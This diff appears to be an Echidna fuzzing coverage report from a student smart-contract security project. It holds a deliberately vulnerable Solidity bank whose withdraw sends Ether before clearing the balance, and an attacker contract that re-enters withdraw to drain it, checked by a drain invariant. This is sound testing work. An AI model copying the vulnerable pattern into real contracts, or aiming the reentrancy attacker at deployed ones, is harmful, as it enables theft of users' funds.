@@ -1,0 +1,60 @@
+/home/ali/TFG/pruebas-echidna/contracts/VulnerableBank.sol
+  1 |     | pragma solidity ^0.8.0;
+  2 |     | 
+  3 | *   | contract VulnerableBank {
+  4 |     |     mapping(address => uint256) public balances;
+  5 |     | 
+  6 | *   |     function deposit() public payable {
+  7 | *   |         balances[msg.sender] += msg.value;
+  8 |     |     }
+  9 |     | 
+ 10 | *   |     function withdraw() public {
+ 11 | *   |         uint256 bal = balances[msg.sender];
+ 12 | *   |         require(bal > 0);
+ 13 |     | 
+ 14 |     |         //Llamada externa antes de actualizar estado
+ 15 | *   |         (bool sent, ) = msg.sender.call{value: bal}("");
+ 16 | *   |         require(sent, "Failed to send Ether");
+ 17 |     | 
+ 18 | *   |         balances[msg.sender] = 0;
+ 19 |     |     }
+ 20 |     | }
+
+/home/ali/TFG/pruebas-echidna/echidna/ReentrancyEchidnaTest.sol
+  1 |     | pragma solidity ^0.8.13;
+  2 |     | 
+  3 |     | import "../contracts/VulnerableBank.sol";
+  4 |     | 
+  5 |     | contract MaliciousAttacker {
+  6 | *   |     VulnerableBank public target;
+  7 |     | 
+  8 | *   |     constructor(VulnerableBank _target) {
+  9 | *   |         target = _target;
+ 10 |     |     }
+ 11 |     | 
+ 12 |     |     receive() external payable {
+ 13 | *   |         if (address(target).balance >= msg.value) {
+ 14 |     |             target.withdraw(); 
+ 15 |     |         }
+ 16 |     |     }
+ 17 |     | 
+ 18 | *   |     function attack() public payable {
+ 19 |     |         
+ 20 | *   |         uint256 amount = 1 ether; 
+ 21 | *   |         if(address(this).balance >= amount) {
+ 22 | *   |             target.deposit{value: amount}();
+ 23 | *   |             target.withdraw();
+ 24 |     |         }
+ 25 |     |     }
+ 26 |     | }
+ 27 |     | 
+ 28 | *r  | contract ReentrancyEchidnaTest is MaliciousAttacker {
+ 29 | *   |     constructor() MaliciousAttacker(new VulnerableBank()) payable {
+ 30 | *   |         target.deposit{value: 10 ether}();
+ 31 |     |     }
+ 32 |     | 
+ 33 |     |     function echidna_test_vault_never_drained() public view returns (bool) {
+ 34 |     |         return address(target).balance >= 10 ether;
+ 35 |     |     }
+ 36 |     | }
+
